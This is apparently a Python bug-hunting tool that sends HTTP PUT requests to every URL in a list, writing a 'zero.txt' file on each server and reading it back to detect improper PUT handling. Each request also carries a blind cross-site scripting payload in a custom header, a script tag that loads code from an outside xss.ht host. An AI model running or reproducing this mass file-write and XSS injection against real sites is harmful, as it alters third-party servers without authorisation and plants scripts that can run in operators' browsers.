import requests
import threading 
from colorama import Fore
import argparse
import time

logo = '''

 /$$$$$$$              /$$     /$$                                  /$$$$$$  /$$   /$$ /$$$$$$$ 
| $$__  $$            | $$    | $$                                 /$$__  $$| $$  | $$| $$__  $$
| $$  \ $$ /$$   /$$ /$$$$$$ /$$$$$$    /$$$$$$   /$$$$$$         | $$  \__/| $$  | $$| $$  \ $$
| $$$$$$$/| $$  | $$|_  $$_/|_  $$_/   /$$__  $$ /$$__  $$ /$$$$$$| $$      | $$  | $$| $$$$$$$/
| $$____/ | $$  | $$  | $$    | $$    | $$$$$$$$| $$  \__/|______/| $$      | $$  | $$| $$____/ 
| $$      | $$  | $$  | $$ /$$| $$ /$$| $$_____/| $$              | $$    $$| $$  | $$| $$      
| $$      |  $$$$$$/  |  $$$$/|  $$$$/|  $$$$$$$| $$              |  $$$$$$/|  $$$$$$/| $$      
|__/       \______/    \___/   \___/   \_______/|__/               \______/  \______/ |__/    
                   
                                                  coded by :- @ZahirTariq3
'''

print(Fore.BLUE + logo)


#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#
parser = argparse.ArgumentParser()
parser.add_argument("-f","--file",help="urls file to scan", required=True)
#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#

args = parser.parse_args()

result = []

def req(url):
    try:
        url = url.strip()
        uurl = url + "/zero.txt"
        headers = {"User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0", "Accept": "application/json, text/plain, */*", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Content-Type": "text/plain", "Te": "trailers", "Connection": "close", "Unknown": "\"><script src=https://zahir009.xss.ht></script>"}
        data = "injected"
        response = requests.put(uurl, headers=headers , data=data)
        time.sleep(.5)
        check = requests.get(uurl)
        output = response_checker(check,uurl)
        return output
    
    except Exception:
        None

    

def response_checker(response , infected):
    if "injected" in response.text:
        print(Fore.GREEN + "IMPROPER PUT FOUND ==> "+ infected)
        result.append(infected)
    else:
        print(Fore.CYAN +"Testing ...")

def main():
    start = time.perf_counter()
    list_of_threads = []

    urls_file = args.file.strip() 

    with open(urls_file,"r") as file:
        for url in file:
            new_threading = threading.Thread(target=req,args=[url])
            new_threading.start()

            list_of_threads.append(new_threading)

        for thread in list_of_threads:
            thread.join()


    


    finish = time.perf_counter()
    print(f'\n\n\Finished in {round(finish-start,2)} second(s)\n')


if __name__ == '__main__':
    main()

###############
## Results
###############

out = open('result.txt','w')
for target in result:
    out.write(str(target))
    out.write('\n')

out.close()
